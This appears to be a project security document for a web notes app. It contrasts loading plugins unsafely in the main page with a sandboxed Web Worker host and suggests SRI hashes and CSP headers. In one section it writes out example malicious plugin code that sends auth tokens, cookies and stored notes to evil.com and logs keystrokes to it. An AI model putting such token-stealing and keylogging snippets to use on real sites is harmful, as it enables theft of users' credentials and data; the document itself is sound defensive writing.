# Security Architecture

## Current Implementation vs Secure Extension Host

### ⚠️ Current (Insecure) Implementation

**File:** `site/src/lib/plugin-loader.js`

```javascript
// Loads plugin JavaScript directly into main page context
const module = await import(pluginUrl);
```

**Security Issues:**
- ❌ Plugin JS has full DOM access
- ❌ Can read localStorage, cookies, tokens
- ❌ Can make arbitrary network requests
- ❌ Can execute any JavaScript
- ❌ Can steal user data

**Trust Model:** You must fully trust plugin authors.

---

### ✅ Secure Implementation (VS Code-style)

**Files:**
- `site/src/lib/secure-plugin-loader.js`
- `site/src/lib/extension-host.worker.js`

```javascript
// Loads plugins in isolated Web Worker
const worker = new Worker('./extension-host.worker.js');
worker.postMessage({ type: 'loadPlugin', pluginUrl });
```

**Security Benefits:**
- ✅ **No DOM access** - Worker has no `window`, `document`, or DOM APIs
- ✅ **No storage access** - Can't read localStorage, cookies, or IndexedDB
- ✅ **Controlled API** - Only functions you explicitly expose
- ✅ **CSP enforcement** - Content Security Policy restricts network requests
- ✅ **Memory isolation** - Separate heap, can't access main thread memory

**Trust Model:** Defense in depth - plugins can only do what the API allows.

---

## Architecture Comparison

### Current (Unsafe)
```
┌────────────────────────────────────┐
│         Main Browser Thread         │
│                                     │
│  ┌──────────┐    ┌──────────────┐ │
│  │ Your App │    │ Plugin Code  │ │
│  │          │◄───┤ (Full Access) │ │
│  └──────────┘    └──────────────┘ │
│       │                  │          │
│       └──────┬───────────┘          │
│              ▼                       │
│    ┌─────────────────────┐         │
│    │  DOM, Storage, APIs  │         │
│    └─────────────────────┘         │
└────────────────────────────────────┘
```

### Secure (VS Code Pattern)
```
┌────────────────────────────────────┐
│         Main Browser Thread         │
│                                     │
│  ┌──────────┐                      │
│  │ Your App │                      │
│  │          │                      │
│  └────┬─────┘                      │
│       │ postMessage (data only)    │
│       │                             │
└───────┼─────────────────────────────┘
        │
┌───────▼─────────────────────────────┐
│      Extension Host (Worker)        │
│                                     │
│    ┌──────────────┐                │
│    │ Plugin Code  │                │
│    │ (Sandboxed)  │                │
│    └──────────────┘                │
│                                     │
│  ❌ No DOM                          │
│  ❌ No localStorage                 │
│  ❌ No cookies                      │
│  ✅ Only message passing            │
└────────────────────────────────────┘
```

---

## What Can Malicious Plugins Do?

### Current Implementation
```javascript
// Malicious plugin JS can do ANYTHING:

// Steal authentication tokens
fetch('https://evil.com', {
  method: 'POST',
  body: JSON.stringify({
    token: localStorage.getItem('auth-token'),
    cookies: document.cookie,
    notes: localStorage.getItem('wasm-notes')
  })
});

// Inject hidden forms
document.body.innerHTML += '<form action="evil.com">';

// Keylogging
document.addEventListener('keydown', (e) => {
  fetch('https://evil.com/log?key=' + e.key);
});

// Cryptomining
while(true) { Math.random(); } // CPU hijacking
```

### Secure Implementation
```javascript
// Malicious plugin in worker CANNOT:

fetch()  // ❌ Blocked by CSP
document // ❌ Undefined in Worker
window   // ❌ Undefined in Worker
localStorage // ❌ Undefined in Worker

// Can ONLY return data through message passing:
self.postMessage({ result: "processed text" });
```

---

## Real-World Examples

### VS Code Web Extensions
- All extensions run in Web Workers
- No direct DOM access
- Communicate via `postMessage` protocol
- Permissions declared in manifest

### Figma Plugins
- Run in sandboxed iframes
- Strict CSP policies
- Limited API surface
- Rate limiting on API calls

### Shopify App Extensions
- Isolated iframe sandboxes
- Declarative UI (no custom JS on main page)
- Server-validated actions

---

## Migration Guide

### Option 1: Use Secure Loader (Recommended)

```typescript
// In NotesApp.tsx
import { SecurePluginLoader } from '../lib/secure-plugin-loader';

const [pluginLoader] = useState(() => new SecurePluginLoader());

// Plugins now run in worker automatically
const html = await pluginLoader.callPlugin('markdown-plugin', 'render', text);
```

### Option 2: Add SRI Hashes (Quick Fix)

```javascript
const PLUGIN_HASHES = {
  'markdown-plugin': 'sha384-abc123...',
  'word-counter-plugin': 'sha384-def456...',
  'tag-manager-plugin': 'sha384-ghi789...'
};

async loadPlugin(pluginId) {
  const response = await fetch(pluginUrl);
  const code = await response.text();

  // Verify integrity
  const hash = await crypto.subtle.digest('SHA-384',
    new TextEncoder().encode(code));

  if (btoa(String.fromCharCode(...new Uint8Array(hash)))
      !== PLUGIN_HASHES[pluginId]) {
    throw new Error('Plugin integrity check failed!');
  }

  // Load verified code
  const module = await import(pluginUrl);
}
```

### Option 3: Add CSP Headers

```javascript
// astro.config.mjs
export default defineConfig({
  vite: {
    server: {
      headers: {
        'Content-Security-Policy':
          "default-src 'self'; " +
          "script-src 'self' 'wasm-unsafe-eval'; " +
          "connect-src 'self'; " +
          "worker-src 'self' blob:;"
      }
    }
  }
});
```

---

## Future: WASI & Component Model

### When They Arrive (2-3+ years)

**WASI Component Model** will provide:
- Standard interface definitions (WIT)
- No JS glue code needed
- Built-in capability security
- Language-agnostic plugins

```wit
// Future: WIT interface definition
package wasm-notes:plugins;

interface text-processor {
  render: func(text: string) -> result<string, error>;
}

world plugin {
  export text-processor;

  // Explicit capabilities
  import logging;  // Only if granted
}
```

```rust
// Plugin code (pure WASM, no JS)
#[component]
impl TextProcessor for MyPlugin {
    fn render(text: String) -> Result<String, Error> {
        Ok(markdown::to_html(&text))
    }
}
```

**Benefits:**
- ✅ No JS execution at all
- ✅ Fine-grained capabilities
- ✅ Composable components
- ✅ True sandboxing

---

## Recommendations

### For This Demo Project
1. ✅ Keep current simple implementation
2. ✅ Add security warnings to README
3. ✅ Only load first-party plugins
4. ✅ Show secure implementation as alternative

### For Production Use
1. ✅ Use Web Worker extension host pattern
2. ✅ Add plugin manifest with permissions
3. ✅ Implement SRI hashes
4. ✅ Add CSP headers
5. ✅ Plugin review process
6. ✅ Rate limiting on plugin calls
7. ✅ Timeout protection

---

## Testing Security

```javascript
// Try this in malicious plugin:
try {
  document.body.innerHTML = 'HACKED!';
} catch (e) {
  // ✅ In worker: "ReferenceError: document is not defined"
}

try {
  localStorage.setItem('stolen', 'data');
} catch (e) {
  // ✅ In worker: "ReferenceError: localStorage is not defined"
}

try {
  await fetch('https://evil.com');
} catch (e) {
  // ✅ Blocked by CSP
}
```

---

## References

- [VS Code Extension Host](https://github.com/microsoft/vscode/tree/main/src/vs/workbench/services/extensions)
- [WebAssembly Component Model](https://github.com/WebAssembly/component-model)
- [MDN: Web Workers Security](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers#web_workers_api)
- [OWASP: Third-Party JavaScript Management](https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html)
